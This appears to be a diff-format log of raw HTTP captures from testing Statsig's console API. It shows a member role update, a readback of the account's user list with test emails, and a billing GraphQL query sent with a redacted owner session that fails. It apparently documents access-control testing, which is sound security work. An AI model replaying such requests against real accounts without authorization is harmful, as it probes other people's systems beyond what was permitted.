+statsig-final-byte-size: 177
+content-length: 177
+vary: Accept-Encoding
+date: Tue, 20 Oct 2026 00:18:38 GMT
+cache-control: no-transform
+referrer-policy: strict-origin-when-cross-origin
+x-content-type-options: nosniff
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000
+
+{"message":"User updated successfully.","data":{"userID":"13B13WHITpDKkMpbi22BGW","email":"mohamed-9499-3@agentmail.to","firstName":"Bruno","lastName":"Hunter","role":"member"}}
+══════════════════════════ r3_11b_readback_member.txt ══════════════════════════
+GET /console/v1/users HTTP/1.1
+Host: statsigapi.net
+STATSIG-API-KEY: console-TVZa...3aXU
+Accept: application/json
+
+===== RESPONSE =====
+HTTP/1.1 200
+access-control-allow-origin: *
+content-type: application/json; charset=utf-8
+statsig-final-byte-size: 567
+content-length: 567
+vary: Accept-Encoding
+date: Tue, 20 Oct 2026 00:18:41 GMT
+cache-control: no-transform
+referrer-policy: strict-origin-when-cross-origin
+x-content-type-options: nosniff
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000
+
+{"message":"User listed successfully.","data":[{"userID":"nZ2wI4FMJek95vjJHdnWR","email":"mohamed-9499-2@agentmail.to","firstName":"Amina","lastName":"Hunter","role":"Owner"},{"userID":"13B13WHITpDKkMpbi22BGW","email":"mohamed-9499-3@agentmail.to","firstName":"Bruno","lastName":"Hunter","role":"member"},{"userID":"5mfafx6vDKTD1rosP4VuNz","email":"encouragingteacher162@agentmail.to","firstName":"Sam","lastName":"Tester","role":"member"}],"pagination":{"itemsPerPage":100,"pageNumber":1,"totalItems":3,"nextPage":null,"previousPage":null,"all":"/console/v1/users"}}
+══════════════════════════ r3_12_billing.txt ══════════════════════════
+POST /api/graphql?company_id=4n6HCY59mDqwX1iSZQtNvx HTTP/1.1
+Host: console.statsig.com
+Content-Type: application/json
+x-csrf-token: 1
+Origin: https://console.statsig.com
+Referer: https://console.statsig.com/4n6HCY59mDqwX1iSZQtNvx/api_keys
+Cookie: <OWNER SESSION — redacted>
+
+{"query": "query GetOrgStripeSubscription { selfServeMonetization { customer { subscription { status trialEnd trialStart currentPeriodEnd } } }, orgStripeSubscription { status planPrice { id } } }", "operationName": null}
+
+===== RESPONSE =====
+HTTP/1.1 400
+content-security-policy: upgrade-insecure-requests;base-uri 'self';script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://dcs-worker.statsig.workers.dev/v1/download_config_specs/ https://*.statsigcdn.com/ https://cdn.console.statsig.com/ https://cdn.amplitude.com/ 'wasm-unsafe-eval' 'sha256-Fk0qgMP68Y3xjWeUiDvCif4CmwwVT+ImSHdCmA5iFlw=';report-uri /api/report_csp_violation;object-src 'none';form-action 'self';
+x-frame-options: DENY
+x-content-type-options: nosniff, nosniff
+content-type: application/json; charset=utf-8
+etag: "6v54pdu20m11"
+content-length: 37
+vary: Accept-Encoding
+date: Tue, 20 Oct 2026 00:18:41 GMT
+cache-control: no-transform
+referrer-policy: strict-origin-when-cross-origin
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+
+{"message":"No matching query found"}
